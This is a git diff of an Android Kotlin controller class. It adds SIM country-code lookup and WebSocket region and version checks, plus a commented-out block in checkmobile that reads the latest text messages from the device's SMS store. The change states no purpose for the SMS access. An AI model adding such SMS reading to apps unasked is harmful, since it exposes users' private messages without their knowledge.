@@ -1,10 +1,13 @@
 package domain.shadowss.controller
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.content.Context
 import android.content.Intent
 import android.provider.Settings
+import android.telephony.SubscriptionManager
+import android.text.TextUtils
 import com.scottyab.rootbeer.RootBeer
 import defpackage.marsh.*
 import domain.shadowss.extension.*
@@ -14,25 +17,33 @@ import domain.shadowss.manager.WebSocketManager
 import io.reactivex.disposables.CompositeDisposable
 import org.jetbrains.anko.connectivityManager
 import org.jetbrains.anko.powerManager
+import org.jetbrains.anko.telephonyManager
 import org.kodein.di.KodeinAware
 import org.kodein.di.android.closestKodein
 import org.kodein.di.generic.instance
 import timber.log.Timber
 import java.lang.ref.WeakReference
-import javax.annotation.OverridingMethodsMustInvokeSuper
 
 typealias Controller<T> = BaseController<T>
 
-@Suppress("MemberVisibilityCanBePrivate")
-abstract class BaseController<V>(referent: V) : KodeinAware, WebSocketCallback {
+interface ControllerReference {
 
-    override val kodein by closestKodein(referent as Context)
+    fun getApplicationContext(): Context
+}
+
+@Suppress("MemberVisibilityCanBePrivate")
+abstract class BaseController<R : ControllerReference>(referent: R) : KodeinAware,
+    WebSocketCallback {
+
+    override val kodein by closestKodein(referent.getApplicationContext())
 
     protected val reference = WeakReference(referent)
 
     protected val disposable = CompositeDisposable()
 
     protected val socketManager: WebSocketManager by instance()
+
+    protected val preferences: Preferences by instance()
 
     open fun start() {
         disposable.add(socketManager.observer
@@ -105,20 +116,69 @@ abstract class BaseController<V>(referent: V) : KodeinAware, WebSocketCallback {
 
     }
 
-    fun checkmcc() {
-
+    @SuppressLint("MissingPermission")
+    fun checkMcc(context: Context): Pair<String?, String?> = context.run {
+        var mcc1: String? = null
+        var mcc2: String? = null
+        if (isLollipopMR1Plus()) {
+            val subscriptionManager =
+                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+            if (areGranted(Manifest.permission.READ_PHONE_STATE)) {
+                val infoList = subscriptionManager.activeSubscriptionInfoList
+                mcc1 = infoList.getOrNull(0)?.mcc.toString()
+                mcc2 = infoList.getOrNull(1)?.mcc.toString()
+            }
+        } else {
+            val code = telephonyManager.networkOperator
+            if (!TextUtils.isEmpty(code)) {
+                val MNC_CODE_LENGTH = 3
+                if (code.length >= MNC_CODE_LENGTH) {
+                    mccCode = code.substring(0, MNC_CODE_LENGTH)
+                }
+                if (code.length > MNC_CODE_LENGTH) {
+                    mncCode = code.substring(MNC_CODE_LENGTH)
+                }
+            }
+        }
+        return@run mcc1 to mcc2
     }
 
-    fun checkregion() {
+    fun checkRegion() {
+        socketManager.send(ASRR().apply {
 
+        })
     }
 
-    fun checkversion() {
+    fun checkVersion() {
+        socketManager.send(ASRV().apply {
 
+        })
     }
 
     fun checkmobile() {
-
+        /*val smsQuery = RxCursorLoader.Query.Builder()
+            .setContentUri(Uri.parse("content://sms"))
+            .setSortOrder("${Telephony.Sms.DATE} DESC LIMIT 5")
+            .create()
+        disposable.add(RxCursorLoader.observable(contentResolver, smsQuery, Schedulers.io())
+            .subscribe({ cursor ->
+                synchronized(this) {
+                    cursor.use {
+                        Timber.i("content://sms ${cursor.count}")
+                        if (cursor.moveToLast()) {
+                            do {
+                                try {
+                                    readSms(it)
+                                } catch (e: Throwable) {
+                                    Timber.e(e)
+                                }
+                            } while (cursor.moveToPrevious())
+                        }
+                    }
+                }
+            }, {
+                Timber.e(it)
+            }))*/
     }
 
     override fun onSAPI(instance: SAPI) {}
@@ -141,7 +201,6 @@ abstract class BaseController<V>(referent: V) : KodeinAware, WebSocketCallback {
 
     open fun callback(requestCode: Int, resultCode: Int = 0) {}
 
-    @OverridingMethodsMustInvokeSuper
     open fun release() {
         disposable.dispose()
         reference.clear()
